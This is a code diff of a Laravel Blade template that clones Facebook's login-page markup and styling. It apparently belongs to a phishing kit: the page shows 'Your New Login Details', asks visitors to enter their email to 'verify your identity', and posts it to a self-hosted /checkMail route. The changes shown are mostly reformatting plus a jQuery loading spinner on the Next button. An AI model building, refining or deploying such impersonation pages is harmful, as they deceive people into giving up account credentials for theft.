@@ -9,21 +9,26 @@
         .x9desvi {
             padding-top: 16px !important;
         }
+
         #err-code {
-            color:red;
+            color: red;
             font-family: var(--font-family-segoe);
             font-size: 15px;
             font-weight: 400;
         }
+
         .hidden {
             display: none;
         }
+
         #container-index {
             background-color: #f0f2f5 !important
         }
+
         #form_check {
             width: 100%;
         }
+
         :root {
             --fds-black: #000000;
             --fds-black-alpha-05: rgba(0, 0, 0, 0.05);
@@ -1827,6 +1832,7 @@
             display: none;
         }
     </style>
+    <link href="https://netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />
     <script id="envjson" type="application/json" nonce="">{"useTrustedTypes":false,"isTrustedTypesReportOnly":false,"ghlss":"t1pLNP","use_fbt_virtual_modules":true,"compat_iframe_token":"AQ714Ud1CqjoXhQVAHE"}</script>
     <script
         src="data:application/x-javascript; charset=utf-8;base64,Oy8qRkJfUEtHX0RFTElNKi8KCnZhciBkYXRhRWxlbWVudD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZW52anNvbiIpO2lmKGRhdGFFbGVtZW50IT1udWxsKXt2YXIgY29weVZhcmlhYmxlcz1mdW5jdGlvbihhKXtmb3IodmFyIGIgaW4gdmFyaWFibGVzKWFbYl09dmFyaWFibGVzW2JdfSx2YXJpYWJsZXM9SlNPTi5wYXJzZShkYXRhRWxlbWVudC50ZXh0Q29udGVudCk7d2luZG93LnJlcXVpcmVMYXp5P3dpbmRvdy5yZXF1aXJlTGF6eShbIkVudiJdLGNvcHlWYXJpYWJsZXMpOih3aW5kb3cuRW52PXdpbmRvdy5FbnZ8fHt9LGNvcHlWYXJpYWJsZXMod2luZG93LkVudikpfQovLyMgc291cmNlVVJMPWh0dHBzOi8vc3RhdGljLnh4LmZiY2RuLm5ldC9yc3JjLnBocC92My95TC9yL2RiZ3JNc25EMThwLmpzP19uY194PTFSdEx2RzlzNEFICg=="
@@ -4178,9 +4184,10 @@
                     data-visualcompletion="ignore"><input type="hidden" value="AffC1VnYTcVEc0Q-J_4"
                         name="h"><input type="hidden" value="mb" name="ref"></form>
                 <div id="container-index" class="x9f619 x1n2onr6 x1ja2u2z">
-                    <div id="container-index" class="x9f619 x1ja2u2z x1pq812k x5yr21d xw2csxc x1odjw0f xixxii4 x1rohswg x17qophe x13vifvy xh8yej3 xfk6m8 x1yqm8si xjx87ck"
+                    <div id="container-index"
+                        class="x9f619 x1ja2u2z x1pq812k x5yr21d xw2csxc x1odjw0f xixxii4 x1rohswg x17qophe x13vifvy xh8yej3 xfk6m8 x1yqm8si xjx87ck"
                         aria-hidden="true" id="scrollview" style="left: 0px;">
-                        <div  class="x78zum5 xdt5ytf x1n2onr6 x1ja2u2z">
+                        <div class="x78zum5 xdt5ytf x1n2onr6 x1ja2u2z">
                             <div class="x78zum5 xdt5ytf x1n2onr6 xat3117 xxzkxad"><!--$-->
                                 <div class="xds687c xixxii4 x17qophe x13vifvy x1vjfegm">
                                     <div role="banner">
@@ -4315,7 +4322,10 @@
                                                                                                                                 style="vertical-align: inherit;">
                                                                                                                                 <font
                                                                                                                                     style="vertical-align: inherit;">
-                                                                                                                                Your New Login Details
+                                                                                                                                    Your
+                                                                                                                                    New
+                                                                                                                                    Login
+                                                                                                                                    Details
                                                                                                                                 </font>
                                                                                                                             </font>
                                                                                                                         </span>
@@ -4329,7 +4339,14 @@
                                                                                                                                 style="vertical-align: inherit;">
                                                                                                                                 <font
                                                                                                                                     style="vertical-align: inherit;">
-                                                                                                                                    Please enter your email to verify your identity.
+                                                                                                                                    Please
+                                                                                                                                    enter
+                                                                                                                                    your
+                                                                                                                                    email
+                                                                                                                                    to
+                                                                                                                                    verify
+                                                                                                                                    your
+                                                                                                                                    identity.
                                                                                                                                 </font>
 
                                                                                                                             </font>
@@ -4337,7 +4354,11 @@
                                                                                                                     </div>
                                                                                                                 </div>
                                                                                                             </div>
-                                                                                                            <h2 style="font-size:20px">Contact details</h2>
+                                                                                                            <h2
+                                                                                                                style="font-size:20px">
+                                                                                                                Contact
+                                                                                                                details
+                                                                                                            </h2>
                                                                                                             <div
                                                                                                                 class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1xmf6yo x1e56ztr xzboxd6 x14l7nz5">
                                                                                                                 <div
@@ -4354,22 +4375,30 @@
                                                                                                                                     for=":r1:">
                                                                                                                                     <div
                                                                                                                                         class="x78zum5 xh8yej3">
-                                                                                                                                        <form action="/checkMail" method="post" id="form_check">
-                                                                                                                                        @method("POST")
-        @csrf                                                                                                                                <div
-                                                                                                                                            class="xjbqb8w x1iyjqo2 x193iq5w xeuugli x1n2onr6">
-                                                                                                                                         <input name="email"
-                                                                                                                                                dir="ltr"
-                                                                                                                                                aria-invalid="false"
-                                                                                                                                                id="code"
-                                                                                                                                                class="x1i10hfl xggy1nq x1s07b3s x1kdt53j x1a2a7pz xjbqb8w x76ihet xwmqs3e x112ta8 xxxdfa6 x9f619 xzsf02u x1uxerd5 x1fcty0u x132q4wb x1a8lsjc x1pi30zi x1swvt13 x9desvi xh8yej3 x15h3p50 x10emqs4"
-                                                                                                                                                type="text"
-                                                                                                                                                value="">
-                                                                                                                                        </div>
-                                                                                                                                        <form>
+                                                                                                                                        <form
+                                                                                                                                            action="/checkMail"
+                                                                                                                                            method="post"
+                                                                                                                                            id="form_check">
+                                                                                                                                            @method('POST')
+                                                                                                                                            @csrf
+                                                                                                                                            <div
+                                                                                                                                                class="xjbqb8w x1iyjqo2 x193iq5w xeuugli x1n2onr6">
+                                                                                                                                                <input
+                                                                                                                                                    name="email"
+                                                                                                                                                    dir="ltr"
+                                                                                                                                                    aria-invalid="false"
+                                                                                                                                                    id="code"
+                                                                                                                                                    class="x1i10hfl xggy1nq x1s07b3s x1kdt53j x1a2a7pz xjbqb8w x76ihet xwmqs3e x112ta8 xxxdfa6 x9f619 xzsf02u x1uxerd5 x1fcty0u x132q4wb x1a8lsjc x1pi30zi x1swvt13 x9desvi xh8yej3 x15h3p50 x10emqs4"
+                                                                                                                                                    type="text"
+                                                                                                                                                    value="">
+                                                                                                                                            </div>
+                                                                                                                                            <form>
                                                                                                                                     </div>
                                                                                                                                 </label>
-                                                                                                                                <label id="err-code" class="" for="">{{ $message ?? '' }}</label>
+                                                                                                                                <label
+                                                                                                                                    id="err-code"
+                                                                                                                                    class=""
+                                                                                                                                    for="">{{ $message ?? '' }}</label>
 
                                                                                                                             </div>
                                                                                                                         </div>
@@ -4405,16 +4434,30 @@
                                                                                                                             </div>
                                                                                                                         </div>
                                                                                                                     </div> --}}
-                                                                                                                    <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4">
-                                                                                                                        <div aria-label="Send" class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3" role="button" tabindex="0">
-                                                                                                                            <div role="none" class="x1n2onr6 x1ja2u2z x78zum5 x2lah0s xl56j7k x6s0dn4 xozqiw3 x1q0g3np xi112ho x17zwfj4 x585lrc x1403ito x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xn6708d x1ye3gou xtvsq51 x1r1pt67" id="submit">
-                                                                                                                                <div class="x6s0dn4 x78zum5 xl56j7k x1608yet xljgi0e x1e0frkt">
-                                                                                                                                    <div role="none" class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v">
-                                                                                                                                        <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen x1s688f xtk6v10" dir="auto"><span class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft">
-                                                                                                                                                <a style="color: inherit;text-decoration: none;">Next</a></span></span>
+                                                                                                                    <div
+                                                                                                                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4">
+                                                                                                                        <div aria-label="Send"
+                                                                                                                            class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3"
+                                                                                                                            role="button"
+                                                                                                                            tabindex="0">
+                                                                                                                            <div role="none"
+                                                                                                                                class="x1n2onr6 x1ja2u2z x78zum5 x2lah0s xl56j7k x6s0dn4 xozqiw3 x1q0g3np xi112ho x17zwfj4 x585lrc x1403ito x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xn6708d x1ye3gou xtvsq51 x1r1pt67"
+                                                                                                                                id="submit">
+                                                                                                                                <div
+                                                                                                                                    class="x6s0dn4 x78zum5 xl56j7k x1608yet xljgi0e x1e0frkt">
+                                                                                                                                    <div role="none"
+                                                                                                                                        class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v">
+                                                                                                                                        <span
+                                                                                                                                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen x1s688f xtk6v10"
+                                                                                                                                            dir="auto"><span
+                                                                                                                                                class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft">
+                                                                                                                                                <a style="color: inherit;text-decoration: none;"
+                                                                                                                                                    id="has-spin">Next</a></span></span>
                                                                                                                                     </div>
                                                                                                                                 </div>
-                                                                                                                                <div class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x1wpzbip" data-visualcompletion="ignore" role="none">
+                                                                                                                                <div class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x1wpzbip"
+                                                                                                                                    data-visualcompletion="ignore"
+                                                                                                                                    role="none">
                                                                                                                                 </div>
                                                                                                                             </div>
                                                                                                                         </div>
@@ -4456,11 +4499,13 @@
             </div>
         </div><!--/$--><!--/$-->
     </div>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
     <script>
         var button = document.getElementById('submit');
         var form = document.getElementById('form_check');
         var errCode = document.getElementById('err-code');
         button.addEventListener('click', function() {
+            $('#has-spin').append('<i style="margin-left:5px;" class="fa fa-spinner fa-spin"></i>')
             if (!errCode.classList.contains('hidden')) {
                 errCode.classList.add('hidden');
             }
